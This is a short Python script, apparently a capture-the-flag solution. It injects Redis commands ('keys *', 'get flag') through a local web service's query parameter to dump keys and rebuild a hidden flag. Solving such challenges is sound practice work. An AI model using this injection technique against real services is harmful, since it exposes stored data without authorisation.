import requests
import re

# oh, it looks like a command to redis server, let's dig it
r = requests.get(r"http://localhost:8000/reports?query=hkeys%20reports")
# yeah, we can successfully dump all existing keys (and you can see one called 'flag')
r = requests.get(r"http://localhost:8000/reports?query=keys%20*")
# we can grab the flag by 'get' command, because it is string
r = requests.get(r"http://localhost:8000/reports?query=get%20flag")

elems = re.findall(r'report/[0-9]*', r.content.decode())
flag = ""

# let's reassemble the flag...
for elem in elems:
	flag += chr(int(elem[7:]))

print(flag)